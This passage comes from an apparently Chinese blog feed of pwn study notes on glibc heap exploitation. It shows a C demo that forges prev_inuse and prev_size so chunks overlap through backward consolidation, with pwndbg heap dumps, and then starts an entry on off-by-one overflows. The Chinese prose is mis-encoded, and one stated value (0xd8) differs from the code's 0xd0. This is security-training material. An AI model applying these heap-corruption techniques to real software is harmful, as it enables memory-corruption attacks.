class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="5-é€šè¿‡extendå‰å‘overlapping"><a class="markdownIt-Anchor" href="#5-é€šè¿‡extendå‰å‘overlapping">#</a> 5ã€é€šè¿‡ extend å‰å‘ overlappingï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 5.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//é˜²æ­¢ä¸topåˆå¹¶</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//ä¿®æ”¹pre_inuseåŸŸ</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//ä¿®æ”¹pre_sizeåŸŸ</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlinkè¿›è¡Œå‰å‘extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//å ä½å—</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡äº”æ¬¡ malloc ä¹‹åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹free äº† chunk1 ä¹‹åï¼Œchunk2 çš„ p ä½å·²ç»å˜æˆ 0 äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000091&lt;======Chunk3</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81&lt;======Top Chunk</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä¿®æ”¹äº† chunk3 çš„ pre_inuseï¼Œä¹Ÿå°±æ˜¯ size çš„æœ€ä½ä¸º P ä½ä¸º 0ï¼Œç„¶åä¿®æ”¹ pre_size ä½ä¸º 0xd8ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x00000000000000d0  0x0000000000000090&lt;======Chunk3</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81&lt;======Top Chunk</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹å‡ºæ¥ï¼Œchunk3 çš„ pre_size åŸŸçš„å¤§å°åˆšå¥½èƒ½å¤ŸåŒ…å«åˆ°å®Œ chunk1 å’Œ chunk2ã€‚ä¹‹å free æ‰äº† chunk3ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x161</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°ï¼Œå‰é¢çš„ä¸‰ä¸ª chunk éƒ½è¢«åˆå¹¶æˆäº†ä¸€ä¸ªï¼Œè¿™é‡Œä¸»è¦æ˜¯å› ä¸º unlink çš„åŸå› ï¼Œå¯¼è‡´äº† chunk3 å’Œå‰é¢çš„ä¸¤ä¸ªï¼ˆä¸»è¦æ˜¯ pre_size æŒ‡å®šçš„å¤§å°èŒƒå›´å†…çš„ï¼‰chunk å‘ç”Ÿäº†åˆå¹¶ã€‚ä¹‹åå†è¿›è¡Œ mallocï¼Œä¼šåˆ†é…èµ°æ–°çš„é‚£ä¸ª chunk1ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x161</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ11ï¼‰--off_by_one</title>
      <link href="/posts/f1497b96.html"/>
      <url>/posts/f1497b96.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°11off_by_one"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°11off_by_one">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ11ï¼‰â€“off_by_one</h1><p>â€‹åœ¨å¤„ç† for å¾ªç¯æˆ–è€… while å¾ªç¯çš„æ—¶å€™ï¼Œæœ‰çš„å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ; i &lt;= <span class="number">0x10</span> ; i ++)&#123;</span><br><span class="line">        buf[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¤šæ¬¡è¾“å…¥å‡ ä¸ª a ä¹‹åï¼Œå‘ç°äº†æœ€åè¾“å‡ºçš„æ—¶å€™è¾“å‡ºäº† 17 ä¸ª aï¼Œæˆ‘çš„ç›®çš„ä»…ä»…åªæ˜¯éœ€è¦ 16 ä¸ª aï¼Œç»“æœè¾“å‡ºäº† 17 ä¸ª aï¼Œåƒè¿™ç§ï¼Œåœ¨å†™å…¥å­—ç¬¦ä¸²çš„æ—¶å€™å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µï¼Œå°±æ˜¯ off by oneã€‚</p><p>â€‹åœ¨å †ä¸­ï¼Œè¿™ç§é—®é¢˜å°¤ä¸ºä¸¥é‡ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¾“å…¥çš„å­—ç¬¦è¦†ç›–äº† heap info çš„ prev_in_use æˆ–è€…å…¶ä»–çš„æ•°æ®ï¼š</p><blockquote><ol><li>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ä¹Ÿå¯ä½¿ç”¨ NULL å­—èŠ‚æº¢å‡ºçš„æ–¹æ³•</li><li>æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šåœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾—  <code>prev_in_use</code>  ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚ï¼ˆ1ï¼‰ è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•ï¼ˆè§ unlink éƒ¨åˆ†ï¼‰è¿›è¡Œå¤„ç†ã€‚ï¼ˆ2ï¼‰ å¦å¤–ï¼Œè¿™æ—¶  <code>prev_size</code>  åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€   <code>prev_size</code>  